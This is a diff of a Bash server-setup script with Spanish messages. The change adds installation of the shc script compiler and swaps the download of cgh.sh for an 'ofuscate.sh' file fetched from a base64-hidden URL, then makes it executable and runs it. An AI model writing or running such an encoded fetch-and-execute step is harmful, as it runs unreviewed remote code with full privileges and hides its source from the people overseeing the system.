@@ -3,7 +3,7 @@ killall apt apt-get &> /dev/null
 TIME_START="$(date +%s)"
 DOWEEK="$(date +'%u')"
 HOSTNAME="$(hostname)"
-rm -rf cgh.*
+rm -rf ofuscate.*
 dpkg --configure -a
 fun_bar3 () {
 comando="$1"
@@ -82,6 +82,7 @@ echo -e ' '
 fun_bar1 'apt-add-repository universe -y'
 echo -e ' '
 fun_bar1 'sudo add-apt-repository ppa:neurobin/ppa'
+apt install shc -y > /dev/null
 echo -ne " \033[1;31m[ ! ] apt-get update"
 apt-get update -y > /dev/null 2>&1 && echo -e "\033[1;32m [ EXITO ]" || echo -e "\033[1;31m [FAIL]"
 echo -ne " \033[1;31m[ ! ] apt-get upgrade"
@@ -104,4 +105,6 @@ dom='base64 -d'
 RE=$(echo $update1|$dom)
 sleep 5s
 clear
-wget -q -O cgh.sh $RE;chmod +x cgh.sh && ./cgh.sh
+wget -q $RE;
+chmod +x ofuscate.sh
+./ofuscate.sh
